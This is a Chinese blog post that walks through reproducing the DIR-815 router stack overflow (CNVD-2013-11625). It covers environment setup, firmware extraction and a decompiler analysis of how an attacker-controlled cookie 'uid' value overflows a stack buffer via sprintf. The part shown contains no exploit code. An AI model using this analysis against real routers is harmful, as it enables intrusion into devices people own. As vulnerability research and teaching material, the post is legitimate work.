<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>DIR-815 栈溢出漏洞(CNVD-2013-11625)复现 | XiDP</title><meta name="author" content="XiDP"><meta name="copyright" content="XiDP"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="复现环境及所需工具漏洞复现环境Ubuntu 24.04.2 LTS 基础工具配置基础的Pwn环境 + binwalk + sasquatch + qemupwn环境配置推荐YX-hueimie师傅的博客★pwn 24.04环境搭建保姆级教程★_ubuntu24 pwn-CSDN博客★pwn..."><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "DIR-815 栈溢出漏洞(CNVD-2013-11625)复现",
  "url": "http://example.com/2025/06/14/DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/",
  "image": "http://example.com/img/Qhead.png",
  "datePublished": "2025-06-13T16:00:00.000Z",
  "dateModified": "2025-06-14T11:12:57.075Z",
  "author": [
    {
      "@type": "Person",
      "name": "XiDP",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/Qhead.png"><link rel="canonical" href="http://example.com/2025/06/14/DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":5,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'DIR-815 栈溢出漏洞(CNVD-2013-11625)复现',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/loading.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> { preloader.endLoading() })

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="/css/progress_bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/Qhead.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/yu2.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">XiDP</span></a><a class="nav-page-title" href="/"><span class="site-name">DIR-815 栈溢出漏洞(CNVD-2013-11625)复现</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">DIR-815 栈溢出漏洞(CNVD-2013-11625)复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-13T16:00:00.000Z" title="发表于 2025-06-14 00:00:00">2025-06-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-14T11:12:57.075Z" title="更新于 2025-06-14 19:12:57">2025-06-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/IOT/">IOT</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CVE%E5%A4%8D%E7%8E%B0/">CVE复现</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:100,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2025-06-14 19:12:57&quot;}" hidden></div><h2 id="复现环境及所需工具"><a href="#复现环境及所需工具" class="headerlink" title="复现环境及所需工具"></a><strong>复现环境及所需工具</strong></h2><h3 id="漏洞复现环境"><a href="#漏洞复现环境" class="headerlink" title="漏洞复现环境"></a><strong>漏洞复现环境</strong></h3><p><code>Ubuntu 24.04.2 LTS</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/1.png"></p>
<h3 id="基础工具配置"><a href="#基础工具配置" class="headerlink" title="基础工具配置"></a><strong>基础工具配置</strong></h3><p>基础的Pwn环境 + binwalk + sasquatch + qemu<br>pwn环境配置推荐YX-hueimie师傅的博客<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/j284886202/article/details/139352067?spm=1001.2014.3001.5502">★pwn 24.04环境搭建保姆级教程★_ubuntu24 pwn-CSDN博客</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/j284886202/article/details/134931709?spm=1001.2014.3001.5502">★pwn 22.04环境搭建保姆级教程★_pwn环境搭建-CSDN博客</a></p>
<p>安装binwalk可以直接使用apt安装，也可以下载binwalk的源码来自己编译</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install binwalk</span><br></pre></td></tr></table></figure>

<p><code>sasquatch</code> 是<code>binwalk</code>用于解压<code>非标准SquashFS文件系统</code>的关键依赖(入门不安装这个那么我们之后binwalk分解固件会发现里面 <code>squashfs-root</code> 文件夹是空的)<br>安装方法如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 安装依赖库（关键步骤，否则编译会失败） </span><br><span class="line">sudo apt-get install build-essential zlib1g-dev liblzma-dev liblzo2-dev </span><br><span class="line"># 克隆仓库并编译 </span><br><span class="line">git clone https:<span class="comment">//github.com/devttys0/sasquatch.git </span></span><br><span class="line">cd sasquatch </span><br><span class="line">./build.sh</span><br></pre></td></tr></table></figure>

<p>如果遇到下面问题，请按照下面文章中的方法解决</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unsquashfs.c:<span class="number">1835</span>:<span class="number">5</span>: error: this ‘<span class="keyword">if</span>’ clause does not guard... [-Werror=misleading-indentation]</span><br><span class="line"> <span class="number">1835</span> |     <span class="keyword">if</span>(swap)</span><br><span class="line">      |     ^~</span><br><span class="line">unsquashfs.c:<span class="number">1841</span>:<span class="number">9</span>: note: ...this statement, but the latter is misleadingly indented as <span class="keyword">if</span> it were guarded by the ‘<span class="keyword">if</span>’</span><br><span class="line"> <span class="number">1841</span> |         read_fs_bytes(fd, SQUASHFS_START, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> squashfs_super_block),</span><br><span class="line">      |         ^~~~~~~~~~~~~</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50883855/article/details/132496258?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522dba4ca36aeb250d8e0b75418bf396d5f%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=dba4ca36aeb250d8e0b75418bf396d5f&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-132496258-null-null.142%5Ev102%5Epc_search_result_base4&utm_term=binwalk%E5%AE%89%E8%A3%85sasquatch&spm=1018.2226.3001.4187">binwalk缺少sasquatch报错_unsquashfs.c:1835:5: error: this ‘if’ clause does -CSDN博客</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone --quiet --depth <span class="number">1</span> --branch <span class="string">&quot;master&quot;</span> https:<span class="comment">//github.com/devttys0/sasquatch</span></span><br><span class="line">cd sasquatch</span><br><span class="line">wget https:<span class="comment">//github.com/devttys0/sasquatch/pull/51.patch &amp;&amp; patch -p1 &lt;51.patch</span></span><br><span class="line">sudo ./build.sh</span><br></pre></td></tr></table></figure>

<p>上面问题解决可能还存在下面问题</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LZMA/lzma465/C/LzmaEnc.c: In function ‘LzmaEnc_CodeOneMemBlock’: LZMA/lzma465/C/LzmaEnc.c:<span class="number">2161</span>:<span class="number">19</span>: error: storing the address of local variable ‘outStream’ in ‘*(CLzmaEnc *)pp.rc.outStream’ [-Werror=dangling-pointer=] <span class="number">2161</span> | p-&gt;rc.outStream = &amp;outStream.funcTable; | ~~~~~~~~~~~~~~~~^~~~~~~~~~~~~~~~~~~~~~ LZMA/lzma465/C/LzmaEnc.c:<span class="number">2145</span>:<span class="number">20</span>: note: ‘outStream’ declared here <span class="number">2145</span> | CSeqOutStreamBuf outStream; | ^~~~~~~~~ LZMA/lzma465/C/LzmaEnc.c:<span class="number">2139</span>:<span class="number">45</span>: note: ‘pp’ declared here <span class="number">2139</span> | SRes <span class="title function_">LzmaEnc_CodeOneMemBlock</span><span class="params">(CLzmaEncHandle pp, Bool reInit, | ~~~~~~~~~~~~~~~^~ cc1: all warnings being treated as errors make: *** [&lt;builtin&gt;: LZMA/lzma465/C/LzmaEnc.o] Error <span class="number">1</span></span></span><br></pre></td></tr></table></figure>

<p>我们需要修改build.sh文件来防止这个错误</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># ...（前面部分不变）</span><br><span class="line"></span><br><span class="line"># Patch, build, and install the source</span><br><span class="line">cd squashfs4<span class="number">.3</span></span><br><span class="line">patch -p0 &lt; ../patches/patch0.txt</span><br><span class="line">cd squashfs-tools</span><br><span class="line">export CFLAGS=<span class="string">&quot;-Wno-error=dangling-pointer&quot;</span>  # 关键修改</span><br><span class="line">make &amp;&amp; $SUDO make install</span><br></pre></td></tr></table></figure>

<p>安装完成后就可以使用 <code>binwalk -Me &lt;文件地址&gt;</code> 来对文件进行分解了,进入分解后的文件夹可以看到很多 <code>www</code> <code>bin</code> <code>usr</code> 等等文件夹，最重要的是还有一个 <code>squashfs-root</code>文件夹 </p>
<p>分解过程中还可能出现软连接有问题，比如我们进入 <code>squashfs-root</code> 文件夹中我们使用 <code>ls -la</code> 指令<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/2.png"><br>这里就发现了一个软连接缺失，指向的是 我们Ubuntu的 <code>/tmp</code> 目录（实际上应该指向路由器的 <code>/tmp</code> 目录，而不是本机的 <code>/tmp</code> 目录），为了安全考虑，<code>binwalk</code> 将这种软链接都置成了 <code>/dev/null</code></p>
<p>这里我们需要恢复成正常的样子，如果放任不管可能导致后续的模拟失败<br>修改方法为<br>进入到 <code>/usr/lib/python3/dist-packages/binwalk/modules</code> 目录下(如果是apt下载的话)<br>修改其中的 <code>extractor.py</code> 文件修改为下图所示，当然先保留原本的文件最好，万一改错了还可以再改回来<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/3.png"><br>具体修改方法参照下面两篇博客<br><a target="_blank" rel="noopener" href="https://www.uf4te.cn/posts/3fd254db.html#%E5%AE%89%E8%A3%85-binwalk">IOT环境搭建与固件分析 | 坠入星野的月🌙</a><br><a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/d1f081a9.html?highlight=mips">https://zikh26.github.io/posts/d1f081a9.html?highlight=mips</a></p>
<p>修改好后解压就不是 <code>/dev/null</code> 如下图所示<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/4.png"></p>
<p>还有一个坑，就是很多时候为了方便我们可能会创建Windows和Ubutnu的共享文件夹，然后将共享文件夹从 <code>/mnt/hgfs/</code> 目录下使用ln指令链接到Ubuntu桌面或者别的什么地方，这里需要注意，如果这么做了就不要在这个共享文件夹里面使用binwalk，因为这样会导致binwalk无法创建软连接，笔者在这里踩坑花费了很多时间</p>
<p>安装qemu虚拟机</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu </span><br><span class="line">sudo apt-get install qemu-user-<span class="type">static</span></span><br><span class="line">sudo apt-get install qemu-system</span><br></pre></td></tr></table></figure>

<h2 id="漏洞基本介绍"><a href="#漏洞基本介绍" class="headerlink" title="漏洞基本介绍"></a><strong>漏洞基本介绍</strong></h2><p>本次复现的CNVD漏洞报告地址:<a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2013-11625">国家信息安全漏洞共享平台</a></p>
<p>根据官方报告可知<code>DIR-645</code>型号的<code>hedwig.cgi</code>中会存在缓冲区溢出的漏洞<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/5.png"></p>
<p><code>固件包（见附件）:DIR815A1_FW103b01.bin</code></p>
<h2 id="分离固件"><a href="#分离固件" class="headerlink" title="分离固件"></a><strong>分离固件</strong></h2><p>将我们的固件包放入到我们配置好环境的Ubuntu虚拟机中<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/6.png"></p>
<p>使用指令 <code>binwalk -Me DIR815A1_FW103b01.bin</code> 来分解它<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/7.png"></p>
<p>分解之后当前文件夹下面会出现一个 <code>_DIR815A1_FW103b01.bin.extracted</code> 文件，也就是我们分解后的程序，根据官网的报告我们已经知道漏洞点在 <code>hedwig.cgi</code> 中所以我们就需要去找这个文件在哪，我们进入我们分解之后的 <code>_DIR815A1_FW103b01.bin.extracted/squashfs-root</code> 中，然后使用find指令来查找，得知它在 <code>_DIR815A1_FW103b01.bin.extracted/squashfs-root/htdocs/web</code> 目录下<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/8.png"></p>
<p>进入该目录后我们发现这个 <code>hedwig.cgi</code> 它其实是一个软连接，我们使用 <code>ls -la</code> 指令来查看就会发现它的本体其实是 <code>/htdocs/cgibin</code> 这个文件<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/9.png"></p>
<p>下面我们进入该目录并使用checksec指令来查看该文件的保护机制<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/10.png"></p>
<p>需要注意的是它的结构为mips而不是我们打pwn常见的amd所以我们需要给IDA安装对应的插件才能分析<br>插件以及安装方法可以参考下面文章:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14461">ida mips插件安装+攻防世界ereere题解-先知社区</a><br>笔者使用的为IDA9.0版本，不需要安装该插件，如果上述插件安装失败的话建议安装IDA9.0版本</p>
<h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a><strong>漏洞点分析</strong></h2><p>进入 <code>main函数</code> 中找到 <code>hedwig.cgi</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/11.png"></p>
<p>进入<code>hedwigcgi_main函数</code>中，发现其中规定了<code>post</code>请求方式<br>然后我们继续进入到 <code>cgibin_parse_request函数</code> 中<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/12.png"></p>
<p>发现里面利用 <code>getenv函数</code> 获取了了三个环境变量, 但是和我们的漏洞没啥关系，只不过利用漏洞的时候这里需要随便输入一些东西作为它们的参数<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/13.png"></p>
<p>这个函数结束后我们回到<code>hedwigcgi_main函数</code><br>我们发现<code>hedwigcgi_main函数</code>下面会调用 <code>sess_get_uid函数</code>, 我们进入其中查看<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/14.png"></p>
<p>进入到其中也是可以直接看到它获取了我们的环境变量 <code>COOKIE</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/15.png"></p>
<p>这里获取到了<code>COOKIE</code>之后赋值给了<code>v3</code>，在后续<code>v3</code>又赋值给了<code>v5</code>，再通过指针的形式传递给<code>v7</code>，在通过对特定符号(比如 <code>=</code> <code>；</code> 等符号)的判断对 <code>COOKIE</code> 进行分离<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/16.png"></p>
<p>再继续往下看 <code>sobj_add_char函数</code> 的功能就和它的函数名字一样，用于添加字符<br>而下面这一段程序的作用就是将 <code>=</code> 前面的内容给 <code>v2</code> 将 <code>=</code> 后面的内容给 <code>v5</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/17.png"></p>
<p>再往下看，这里判断 <code>v2</code> 的内容是不是 <code>uid</code> 判断之后将 <code>v4</code> 的内容放入 <code>string</code> 中，然后再拼接到 <code>a1</code> 里面<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/18.png"><br>所以我们可以得到的结论就是 <code>sess_get_uid函数</code> 的作用就是将 <code>COOKIE</code> 中 <code>uid=</code> 后面的内容提取出来</p>
<p>再次回到我们的 <code>hedwigcgi_main函数</code> 我们可以看到下面的 <code>sprintf函数</code>，这个 <code>sprintf函数</code> 就是我们的一个漏洞点<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/19.png"></p>
<p>通过阅读代码逻辑 <code>sprintf函数</code> 的第四个参数 <code>string</code> 其实就是 <code>v4</code> ，而这里的 <code>v4</code> 我们通过上面分析可以得知 <code>v4</code> 其实就是传入的 <code>cookie</code> 中的 <code>uid=</code> 后面的内容，这个部分的内容以及长度其实我们是可以控制的， 而我们的 <code>v27</code> 数组的大小为 <code>1024</code> 所以这里可能存在栈溢出<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/20.png"></p>
<p>而继续往下阅读代码，在 <code>hedwigcgi_main函数</code> 的 133行同样还有一个 <code>sprintf函数</code>， 同样也是往 <code>v27</code> 这个数组中输入<br>输入的内容 <code>v20</code> 的内容也是 <code>v4</code>，而 <code>v4</code> 从第一个 <code>sprintf函数</code> 到这第二个 <code>sprintf函数</code> 没有发生改变，所以同样 <code>v4</code> 也是 <code>cookie</code> 中的 <code>uid=</code> 后面的内容,所以利用漏洞的时候我们只需要将 <code>cookie</code> 的 <code>uid=</code> 后面的内容当成 <code>payload</code> 来输入就行了<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/21.png"></p>
<p>在利用漏洞之前我们回到漏洞代码之前，我们发现如果想要利用下面的漏洞，我们还需要考虑绕过下面这两个 <code>if</code>  </p>
<ol>
<li>我们必须要有<code>/var/tmp/temp.xml</code> </li>
<li>这个 <code>haystack</code> 需要为 <code>非0</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/22.png"></li>
</ol>
<p>绕过 <code>1</code> 的方法: 在我们模拟环境的时候在系统内创建一个<code>/var/tmp</code>文件夹就行<br>绕过 <code>2</code> 的方法: 在 <code>cgibin_parse_request(sub_409A6C, 0, 0x20000);</code> 的 <code>sub_409A6C</code> 中有对 <code>haystack</code> 进行操作<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/23.png"></p>
<p>而进入 <code>sub_409A6C</code> 的条件为使用<code>POST方式</code>传入内容<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/24.png"></p>
<p>但是如果需要使用 <code>POST</code> 进行传参就需要进入到 <code>cgibin_parse_request函数</code> 如下图所示的部分<br>这个部分return进行了跳转，调试的时候我们会知道这里是 <code>sub_403b10函数</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/25.png"><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/26.png"><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/27.png"></p>
<p>那么我们进入<code>sub_403b10函数</code>， 接着跟进进入 <code>sub_402FFC函数</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/28.png"></p>
<p>在 <code>sub_402FFC函数</code> 函数中进入 <code>sub_402B40函数</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/29.png"></p>
<p>最终找到下面这段程序<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/30.png"></p>
